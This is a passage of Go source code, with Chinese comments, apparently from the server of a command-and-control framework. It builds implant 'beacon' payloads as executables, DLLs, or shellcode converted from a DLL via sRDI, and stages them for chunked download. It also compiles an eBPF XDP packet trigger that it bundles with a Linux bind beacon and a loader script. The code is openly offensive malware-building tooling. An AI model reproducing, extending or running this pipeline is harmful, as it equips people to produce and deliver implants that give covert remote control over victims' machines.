	b, bad := newC2VpsBuild(ctx, machine, payload.ID)
	if bad != "" {
		return nil, &errC2BuildStep{bad}
	}
	artifact := pv.Artifact
	stageArt := spec.StageArtifact
	if stageArt != pgdb.C2PayloadArtifactExe && stageArt != pgdb.C2PayloadArtifactDll {
		stageArt = pgdb.C2PayloadArtifactExe
		if artifact == pgdb.C2PayloadArtifactShellcode {
			stageArt = pgdb.C2PayloadArtifactDll
		}
	}

	// ---- staged 前半:构建完整 stage 并注册 blob ----
	if pv.Staged {
		stageZip, rerr := os.ReadFile(s.c2StageSrcZipPath(payload.ID))
		if rerr != nil {
			return b.logBytes(), &errC2BuildStep{fmt.Sprintf("读取 stage 源码包失败(%s 被清理或未生成): %v", filepath.Base(s.c2StageSrcZipPath(payload.ID)), rerr)}
		}
		if err := b.clean(); err != nil {
			return b.logBytes(), err
		}
		if err := b.uploadZipAndExtract(stageZip); err != nil {
			return b.logBytes(), err
		}
		if err := b.probeGo(machine); err != nil {
			return b.logBytes(), err
		}
		if err := b.prepareModuleIfNeeded(); err != nil {
			return b.logBytes(), err
		}
		var stageBin []byte
		if stageArt == pgdb.C2PayloadArtifactDll {
			cc, cerr := b.probeCC(machine, "windows")
			if cerr != nil {
				return b.logBytes(), cerr
			}
			if err := b.buildCShared("windows", cc, "stage_dll.dll"); err != nil {
				return b.logBytes(), err
			}
			stageBin, err = b.fetchFile("stage_dll.dll")
		} else {
			if err := b.buildMain(c2GoosForTarget(payload.Target), "stage_bin"); err != nil {
				return b.logBytes(), err
			}
			stageBin, err = b.fetchFile("stage_bin")
		}
		if err != nil {
			return b.logBytes(), err
		}
		if werr := os.MkdirAll(filepath.Dir(s.c2StageBlobPath(payload.ID)), 0o755); werr != nil {
			return b.logBytes(), fmt.Errorf("建 stage 目录失败: %w", werr)
		}
		if werr := os.WriteFile(s.c2StageBlobPath(payload.ID), stageBin, 0o600); werr != nil {
			return b.logBytes(), fmt.Errorf("写 stage blob 失败: %w", werr)
		}
		stageSum := sha256.Sum256(stageBin)
		b.logf("[stage] %s 已注册(%d bytes, sha256=%s…),供 stage_get 分片拉取",
			filepath.Base(s.c2StageBlobPath(payload.ID)), len(stageBin), hex.EncodeToString(stageSum[:])[:16])
		if err := b.clean(); err != nil {
			return b.logBytes(), err
		}
	}

	// ---- 交付物:stager(staged)或完整产物(stageless)----
	zipBytes, rerr := os.ReadFile(payload.FilePath)
	if rerr != nil {
		return b.logBytes(), &errC2BuildStep{fmt.Sprintf("读取载荷源码包失败: %v", rerr)}
	}
	if err := b.uploadZipAndExtract(zipBytes); err != nil {
		return b.logBytes(), err
	}
	if err := b.probeGo(machine); err != nil {
		return b.logBytes(), err
	}
	if err := b.prepareModuleIfNeeded(); err != nil {
		return b.logBytes(), err
	}
	var bin []byte
	outBase := fmt.Sprintf("beacon_%d", payload.ID)
	switch artifact {
	case pgdb.C2PayloadArtifactExe:
		if err := b.buildMain(c2GoosForTarget(payload.Target), outBase); err != nil {
			return b.logBytes(), err
		}
		bin, err = b.fetchFile(outBase)
	case pgdb.C2PayloadArtifactDll:
		cc, cerr := b.probeCC(machine, "windows")
		if cerr != nil {
			return b.logBytes(), cerr
		}
		if err := b.buildCShared("windows", cc, outBase+".dll"); err != nil {
			return b.logBytes(), err
		}
		bin, err = b.fetchFile(outBase + ".dll")
	case pgdb.C2PayloadArtifactShellcode:
		// dll 构建完成后本机 sRDI 转换(纯 Go 字节拼装,不 exec;契约 §19)。
		cc, cerr := b.probeCC(machine, "windows")
		if cerr != nil {
			return b.logBytes(), cerr
		}
		if err := b.buildCShared("windows", cc, outBase+".dll"); err != nil {
			return b.logBytes(), err
		}
		dllBytes, ferr := b.fetchFile(outBase + ".dll")
		if ferr != nil {
			return b.logBytes(), ferr
		}
		sc, serr := c2center.ConvertDLLToShellcode(dllBytes, c2SRDIExportName, nil, 0)
		if serr != nil {
			return b.logBytes(), &errC2BuildStep{fmt.Sprintf("sRDI 转换失败: %v", serr)}
		}
		bin = sc
		b.logf("[srdi] DLL(%d bytes)→ shellcode(%d bytes),导出 %q", len(dllBytes), len(sc), c2SRDIExportName)
	default:
		return b.logBytes(), &errC2BuildStep{fmt.Sprintf("产物形态 %q 不支持矩阵构建", artifact)}
	}
	if err != nil {
		return b.logBytes(), err
	}
	outPath, werr := s.c2WriteArtifact(payload.ID, artifact, payload.Target, bin)
	if werr != nil {
		return b.logBytes(), werr
	}
	sum := sha256.Sum256(bin)
	b.logf("[ok] %s (%d bytes, sha256=%s…)", filepath.Base(outPath), len(bin), hex.EncodeToString(sum[:])[:16]+"…")
	return b.logBytes(), nil
}

// execC2BuildEbpf eBPF 触发器构建(stretch;契约 §19:clang 探测,无则明确报错):
// 触发器源码资产(c2center.EbpfTriggerAssets)clang -target bpf 编译 + bind beacon
// go build,本地打包 zip(触发器 .o + beacon + 加载脚本 + README)回填。
func (s *Server) execC2BuildEbpf(ctx context.Context, job *pgdb.C2Job, spec c2BuildSpec) ([]byte, error) {
	payload, _, err := s.c2PayloadAndV3ForJob(job)
	if err != nil {
		return nil, err
	}
	machine, err := s.c2MachineForJob(job)
	if err != nil {
		return nil, err
	}
	assets, err := c2center.EbpfTriggerAssets()
	if err != nil {
		return nil, &errC2BuildStep{err.Error()}
	}
	b, bad := newC2VpsBuild(ctx, machine, payload.ID)
	if bad != "" {
		return nil, &errC2BuildStep{bad}
	}
	// 1) bind beacon 源码 zip(main.go)。
	zipBytes, rerr := os.ReadFile(payload.FilePath)
	if rerr != nil {
		return b.logBytes(), &errC2BuildStep{fmt.Sprintf("读取载荷源码包失败: %v", rerr)}
	}
	if err := b.clean(); err != nil {
		return b.logBytes(), err
	}
	if err := b.uploadZipAndExtract(zipBytes); err != nil {
		return b.logBytes(), err
	}
	// 2) 工具链探测(go + clang + 内核头)。
	if err := b.probeGo(machine); err != nil {
		return b.logBytes(), err
	}
	if err := b.prepareModuleIfNeeded(); err != nil {
		return b.logBytes(), err
	}
	if err := b.probeClang(machine); err != nil {
		return b.logBytes(), err
	}
	// 3) 上传触发器源码资产。
	assetNames := make([]string, 0, len(assets))
	for name := range assets {
		assetNames = append(assetNames, name)
	}
	sort.Strings(assetNames)
	for _, name := range assetNames {
		if err := b.uploadFile("上传 "+filepath.Base(name), filepath.Base(name), assets[name]); err != nil {
			return b.logBytes(), err
		}
	}
	// 4) clang 编译触发器(TRIGGER_PORT 与 bind beacon 的监听端口同参,便于记忆)。
	triggerPort := spec.BindPort
	if triggerPort <= 0 {
		triggerPort = 47771
	}
	clangCmd := fmt.Sprintf("clang -O2 -g -target bpf -DTRIGGER_PORT=%d -c xdp_trigger.c -o trigger.o", triggerPort)
	if _, err := b.run("clang -target bpf", clangCmd, 5*time.Minute); err != nil {
		return b.logBytes(), err
	}
	triggerObj, err := b.fetchFile("trigger.o")
	if err != nil {
		return b.logBytes(), err
	}
	// 5) bind beacon 构建(linux)。
	if _, err := b.run("探测 Go(linux)", "test \"$(uname -s)\" = Linux", 30*time.Second); err != nil {
		return b.logBytes(), &errC2BuildStep{"eBPF 触发器构建要求构建机为 Linux(触发器 .o 与目标平台一致)"}
	}
	if err := b.buildMain("linux", "beacon_bind"); err != nil {
		return b.logBytes(), err
	}
	beaconBin, err := b.fetchFile("beacon_bind")
	if err != nil {
		return b.logBytes(), err
	}
	// 6) 本地打包 zip(触发器 .o + beacon + 加载脚本 + README)。
	loadScript := assets["ebpf_trigger/load_trigger.sh"]
	readme := assets["ebpf_trigger/README.md"]
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range []struct{ name, data string }{
		{"xdp_trigger.o", string(triggerObj)},
		{"beacon_bind", string(beaconBin)},
		{"load_trigger.sh", string(loadScript)},
		{"README.md", string(readme)},
	} {
		w, zerr := zw.Create(f.name)
		if zerr != nil {
			return b.logBytes(), zerr
		}
		if _, werr := w.Write([]byte(f.data)); werr != nil {
			return b.logBytes(), werr
		}
	}
	if err := zw.Close(); err != nil {
		return b.logBytes(), err
	}
	// 7) 回填(artifact=ebpf;下载端点取 zip 包)。
	outPath, werr := s.c2WriteArtifact(payload.ID, pgdb.C2PayloadArtifactEbpf, "linux", buf.Bytes())
	if werr != nil {
		return b.logBytes(), werr
	}
	sum := sha256.Sum256(buf.Bytes())
	b.logf("[ok] %s (触发器 %d bytes + beacon %d bytes + 脚本/文档,包 %d bytes, sha256=%s…)",
		filepath.Base(outPath), len(triggerObj), len(beaconBin), buf.Len(), hex.EncodeToString(sum[:])[:16]+"…")
	return b.logBytes(), nil
}
